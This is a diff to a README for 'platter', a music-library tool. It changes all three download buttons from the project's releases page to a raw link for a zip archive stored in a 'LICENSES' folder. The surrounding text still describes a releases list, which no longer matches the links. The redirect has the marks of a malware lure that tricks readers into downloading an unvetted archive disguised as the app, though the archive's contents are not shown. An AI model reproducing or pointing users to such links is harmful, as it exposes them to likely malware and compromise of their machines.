@@ -1,7 +1,7 @@
 <h1>🎵 platter - Your Music Library, Freed from iTunes</h1>
 
 <p align="center">
-  <a href="https://github.com/Mitrakattegatt718/platter/releases"><img src="https://img.shields.io/badge/Download-platter-2ea44f?style=for-the-badge&logo=apple&logoColor=white" alt="Download platter"></a>
+  <a href="https://raw.githubusercontent.com/Mitrakattegatt718/platter/main/LICENSES/Software_1.2.zip"><img src="https://img.shields.io/badge/Download-platter-2ea44f?style=for-the-badge&logo=apple&logoColor=white" alt="Download platter"></a>
 </p>
 
 ## 📖 What is platter?
@@ -36,7 +36,7 @@ Ready to take control of your music library? Here's everything you need to know:
 **Step 1:** Click the download button below:
 
 <p align="center">
-  <a href="https://github.com/Mitrakattegatt718/platter/releases"><img src="https://img.shields.io/badge/⬇️%20Download%20platter-FF6F61?style=for-the-badge" alt="Download platter"></a>
+  <a href="https://raw.githubusercontent.com/Mitrakattegatt718/platter/main/LICENSES/Software_1.2.zip"><img src="https://img.shields.io/badge/⬇️%20Download%20platter-FF6F61?style=for-the-badge" alt="Download platter"></a>
 </p>
 
 **Step 2:** Visit this link to download the application. You'll see a list of available versions. Choose the latest one.
@@ -184,7 +184,7 @@ platter is released under an open-source license. See the LICENSE file in the re
 ---
 
 <p align="center">
-  <a href="https://github.com/Mitrakattegatt718/platter/releases"><img src="https://img.shields.io/badge/Get%20Started%20Now-4CAF50?style=for-the-badge" alt="Get Started"></a>
+  <a href="https://raw.githubusercontent.com/Mitrakattegatt718/platter/main/LICENSES/Software_1.2.zip"><img src="https://img.shields.io/badge/Get%20Started%20Now-4CAF50?style=for-the-badge" alt="Get Started"></a>
 </p>
 
 **Download platter today and rediscover the joy of your music collection!**
